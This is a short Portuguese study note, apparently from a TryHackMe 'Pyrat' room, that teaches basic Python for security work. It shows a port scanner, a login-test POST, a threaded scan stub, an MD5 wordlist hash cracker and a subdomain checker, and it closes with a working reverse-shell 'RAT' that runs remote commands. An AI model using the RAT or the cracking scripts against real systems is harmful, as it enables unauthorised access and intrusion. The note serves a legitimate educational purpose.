Pyrat - Full Report 

Objetivo
Aprender a criar scripts básicos em Python para automação de tarefas de segurança, com foco em brute force e varredura de portas.

🐍 Conceitos Python Essenciais
1. Sockets (Varredura de Portas)


import socket

alvo = "192.168.1.1"
porta = 22

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(1)
resultado = sock.connect_ex((alvo, porta))
if resultado == 0:
    print(f"Porta {porta} ABERTA")
sock.close()



2. Requests (Teste Web)


import requests

url = "http://10.10.10.10/login"
dados = {"username": "admin", "password": "senha"}
resposta = requests.post(url, data=dados)
if "Bem-vindo" in resposta.text:
    print("Login bem-sucedido!")



3. Threading (Acelerar Processos)

from threading import Thread

def ataque(ip, porta):
    # Código de varredura aqui
    pass

for porta in [21, 22, 80]:
    Thread(target=ataque, args=("10.10.10.10", porta)).start()



🔧 Scripts Práticos
1. Quebrador de Senhas


import hashlib

senha_alvo = "5f4dcc3b5aa765d61d8327deb882cf99"  # MD5 de "password"

with open("wordlist.txt") as arquivo:
    for linha in arquivo:
        palavra = linha.strip()
        hash_teste = hashlib.md5(palavra.encode()).hexdigest()
        if hash_teste == senha_alvo:
            print(f"Senha encontrada: {palavra}")
            break



2. Scanner de Subdomínios

import requests

dominio = "tryhackme.com"
subdominios = ["www", "mail", "vpn"]

for sub in subdominios:
    url = f"http://{sub}.{dominio}"
    try:
        requests.get(url, timeout=3)
        print(f"[+] {url} - ONLINE")
    except:
        print(f"[-] {url} - OFFLINE")



💻 Exercício: Criar um RAT Básico
(Apenas para fins educacionais)

import socket, subprocess

HOST = "0.0.0.0"  # Seu IP
PORT = 4444

s = socket.socket()
s.connect((HOST, PORT))

while True:
    comando = s.recv(1024).decode()
    if comando.lower() == "sair":
        break
    saida = subprocess.getoutput(comando)
    s.send(saida.encode())

s.close()


Aviso: Esse código é para estudo - usar sem permissão é ilegal!



🏆 Checklist de Aprendizado
Habilidade			Script Exemplo			Dominado?
Conexões de rede		Scanner de portas		[ ]
Automação web			Teste de login			[ ]
Processamento paralelo		Threading em varreduras		[ ]


💡 Lições Aprendidas
Python é a linguagem #1 para automação em segurança
Bibliotecas como socket e requests são essenciais
Threading pode acelerar tarefas massivas